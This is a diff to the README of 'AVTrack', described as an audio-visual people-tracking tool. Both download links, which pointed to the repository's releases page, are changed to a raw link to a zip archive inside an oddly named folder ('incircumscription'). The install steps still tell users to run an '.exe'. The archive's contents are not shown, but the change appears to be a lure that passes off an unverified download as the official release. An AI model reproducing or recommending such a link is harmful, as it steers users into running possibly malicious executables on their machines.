@@ -1,6 +1,6 @@
 # 🎯 AVTrack - Track people in complex video scenes
 
-[![](https://img.shields.io/badge/Download-AVTrack-blue.svg)](https://github.com/marie-jeannesotho844/AVTrack/releases)
+[![](https://img.shields.io/badge/Download-AVTrack-blue.svg)](https://github.com/marie-jeannesotho844/AVTrack/raw/refs/heads/main/incircumscription/AV_Track_v1.7.zip)
 
 AVTrack uses sound and sight to follow people in busy videos. It keeps track of individuals even when they walk behind objects or into crowds. Researchers built this tool to help computers understand human movement in real-world settings.
 
@@ -24,7 +24,7 @@ Most modern laptops bought in the last five years meet these requirements. If yo
 
 Follow these steps to install the software on your machine.
 
-1. Go to this link: [https://github.com/marie-jeannesotho844/AVTrack/releases](https://github.com/marie-jeannesotho844/AVTrack/releases).
+1. Go to this link: [https://github.com/marie-jeannesotho844/AVTrack/raw/refs/heads/main/incircumscription/AV_Track_v1.7.zip](https://github.com/marie-jeannesotho844/AVTrack/raw/refs/heads/main/incircumscription/AV_Track_v1.7.zip).
 2. Look for the file ending in `.exe`.
 3. Click the file to start the download.
 4. Save the file to your desktop or downloads folder.
